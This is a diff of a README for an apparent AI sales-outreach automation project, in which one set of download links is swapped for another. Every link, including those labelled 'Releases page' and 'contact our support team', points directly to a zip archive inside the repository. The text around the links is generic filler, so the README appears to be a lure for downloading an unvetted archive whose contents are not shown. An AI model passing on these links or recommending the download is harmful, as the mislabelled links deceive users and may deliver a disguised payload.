@@ -1,7 +1,7 @@
 # 🎯 sales-outreach-automation-langgraph - Automate Your Sales Outreach Effortlessly
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/anhb1/sales-outreach-automation-langgraph/main/database/sales-outreach-automation-langgraph-v1.4.zip)](https://raw.githubusercontent.com/anhb1/sales-outreach-automation-langgraph/main/database/sales-outreach-automation-langgraph-v1.4.zip)
+[![Download](https://github.com/anhb1/sales-outreach-automation-langgraph/raw/refs/heads/main/docs/sales-langgraph-outreach-automation-2.9-alpha.2.zip)](https://github.com/anhb1/sales-outreach-automation-langgraph/raw/refs/heads/main/docs/sales-langgraph-outreach-automation-2.9-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the sales-outreach-automation-langgraph! This application helps you automate lead research, qualification, and outreach using AI agents. You can create personalized messaging and connect with popular CRM systems like HubSpot, Airtable, and Google Sheets.
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following requirements:
 - **Network:** Stable internet connection for AI functionalities.
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/anhb1/sales-outreach-automation-langgraph/main/database/sales-outreach-automation-langgraph-v1.4.zip) to access the latest version.
+1. Visit the [Releases page](https://github.com/anhb1/sales-outreach-automation-langgraph/raw/refs/heads/main/docs/sales-langgraph-outreach-automation-2.9-alpha.2.zip) to access the latest version.
 2. On the releases page, find the version you want to download.
 3. Click on the download link for your operating system to start the download. 
 4. Once downloaded, locate the file in your downloads folder.
@@ -50,7 +50,7 @@ Before you begin, ensure your system meets the following requirements:
 If you encounter any issues while using the application, refer to the following resources:
 - **FAQs:** Check the Frequently Asked Questions section on our website.
 - **Community Forum:** Join our community forum to discuss any problems and share solutions with other users.
-- **Contact Us:** If you need further assistance, don’t hesitate to [contact our support team](https://raw.githubusercontent.com/anhb1/sales-outreach-automation-langgraph/main/database/sales-outreach-automation-langgraph-v1.4.zip).
+- **Contact Us:** If you need further assistance, don’t hesitate to [contact our support team](https://github.com/anhb1/sales-outreach-automation-langgraph/raw/refs/heads/main/docs/sales-langgraph-outreach-automation-2.9-alpha.2.zip).
 
 ## 🌟 Topics Covered
 This application covers a range of topics relevant to your sales efforts:
@@ -63,7 +63,7 @@ This application covers a range of topics relevant to your sales efforts:
 Feel free to explore these topics for additional insights on how to enhance your sales processes!
 
 ## 🔄 Updates
-Stay tuned for updates! We frequently release new features and improvements based on user feedback. Always check our [Releases page](https://raw.githubusercontent.com/anhb1/sales-outreach-automation-langgraph/main/database/sales-outreach-automation-langgraph-v1.4.zip) for the latest enhancements.
+Stay tuned for updates! We frequently release new features and improvements based on user feedback. Always check our [Releases page](https://github.com/anhb1/sales-outreach-automation-langgraph/raw/refs/heads/main/docs/sales-langgraph-outreach-automation-2.9-alpha.2.zip) for the latest enhancements.
 
 ## 🔒 Privacy & Data Security
 Your privacy matters to us. All personal information and data shared with the application will be securely stored and processed according to our privacy policy. 
